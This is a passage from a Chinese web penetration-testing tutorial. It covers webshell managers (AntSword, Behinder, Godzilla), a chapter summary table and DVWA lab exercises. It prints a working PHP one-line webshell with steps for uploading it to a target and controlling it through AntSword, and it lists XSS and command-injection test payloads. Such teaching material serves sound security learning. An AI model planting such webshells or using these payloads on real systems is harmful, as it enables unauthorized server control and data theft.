功能强大，界面也好看，
还能装插件，
强烈推荐！

支持：
  ✓ PHP/ASP/ASPX/CFM...
  ✓ 文件管理
  ✓ 虚拟终端
  ✓ 数据库管理
  ✓ 插件市场
  ✓ 编码/加密绕过
  ✓ ......

官网：https://github.com/AntSwordProject/antSword
```

### 3.7.3 冰蝎（Behinder）—— 动态加密

```
也是国产的，特点是流量加密，
不容易被WAF检测到。

支持：
  ✓ PHP/JSP/ASPX
  ✓ 双向加密
  ✓ 内存马
  ✓ 绕过WAF
```

### 3.7.4 哥斯拉（Godzilla）—— 后起之秀

```
最近很火的一个WebShell管理工具，
功能也很强，
支持很多种加密方式和绕过方式。
```

### 3.7.5 怎么用蚁剑连一句话

```
1. 先上传一句话木马到目标服务器
   比如：<?php @eval($_POST['cmd']); ?>
   保存为 shell.php

2. 打开蚁剑
   右键 → 添加数据
   URL地址：http://目标/shell.php
   连接密码：cmd
   （因为我们POST参数是cmd）
   编码：选BASE64或者默认
   点"测试连接"
   连接成功的话点"添加"

3. 双击添加的Shell
   就能看到文件管理界面了
   可以上传下载文件、执行命令、管理数据库...
```

---

## 3.8 本章总结

这一章我们讲了Web渗透测试的核心内容，
内容很多，慢慢来，一个一个练。

```
✅ Burp Suite使用
  ├── Proxy抓包
  ├── Repeater重放
  ├── Intruder爆破
  └── 常用技巧

✅ SQL注入
  ├── 联合查询注入
  ├── 报错注入
  ├── 盲注（布尔+时间）
  ├── SQLMap使用
  └── 防御方法

✅ XSS跨站脚本
  ├── 反射型
  ├── 存储型
  ├── DOM型
  ├── 绕过姿势
  └── 防御方法

✅ 文件上传漏洞
  ├── 一句话木马
  ├── 各种绕过姿势
  └── 防御方法

✅ 命令注入
  ├── 命令连接符
  ├── 实战演示
  └── 防御方法

✅ 其他常见漏洞
  ├── CSRF
  ├── SSRF
  ├── XXE
  ├── 文件包含
  └── 逻辑漏洞

✅ WebShell管理工具
  ├── 蚁剑
  ├── 冰蝎
  └── 哥斯拉
```

### 关键知识点回顾

| 漏洞类型 | 危害等级 | 测试方法 | 常用工具 |
|----------|----------|----------|----------|
| SQL注入 | ⭐⭐⭐⭐⭐ | 单引号、and 1=1 | SQLMap |
| XSS | ⭐⭐⭐⭐ | `<script>alert(1)</script>` | XSS平台、BeEF |
| 文件上传 | ⭐⭐⭐⭐⭐ | 上传各种格式的文件 | 蚁剑、冰蝎 |
| 命令注入 | ⭐⭐⭐⭐⭐ | `; whoami` | 各种反弹Shell |
| CSRF | ⭐⭐⭐ | 看请求里有没有Token | - |
| SSRF | ⭐⭐⭐⭐ | 让服务器请求内网 | Gopher |
| XXE | ⭐⭐⭐ | 构造恶意XML | - |
| 逻辑漏洞 | ⭐⭐⭐⭐ | 各种业务测试 | Burp |

### 课后练习

```
练习1（必做）：
  把DVWA里Low难度的每个漏洞都玩一遍，
  包括：
  → SQL Injection
  → SQL Injection (Blind)
  → XSS (Reflected)
  → XSS (Stored)
  → Command Injection
  → File Upload
  → File Inclusion
  → CSRF
  每个都至少做一遍，最好写个笔记。

练习2（必做）：
  用SQLMap跑一遍DVWA的SQL注入，
  把users表的数据都导出来。

练习3（选做）：
  试试DVWA Medium难度的，
  看看和Low有什么不一样，
  怎么绕过。

练习4（选做）：
  下载个蚁剑，
  在DVWA的文件上传里传个一句话，
  用蚁剑连上去玩玩。
```

---

## 下一章预告

下一章我们会讲**漏洞利用和后渗透**——
拿到WebShell之后怎么提权、怎么内网横向移动、
怎么维持访问、怎么抹痕迹。

更多精彩内容，我们下章见！👋

---

> 💡 **本章小彩蛋**
> 
> 你知道吗？SQL注入和XSS这些漏洞，
> 从二十几年前就有了，
> 到现在还是OWASP Top 10里的常客。
> 
> 为什么这么多年了还有这些漏洞？
> 因为总有人不注意安全，
> 总有人偷懒不做过滤。
> 
> 所以学好这些经典漏洞，
> 不管过多少年都有用~
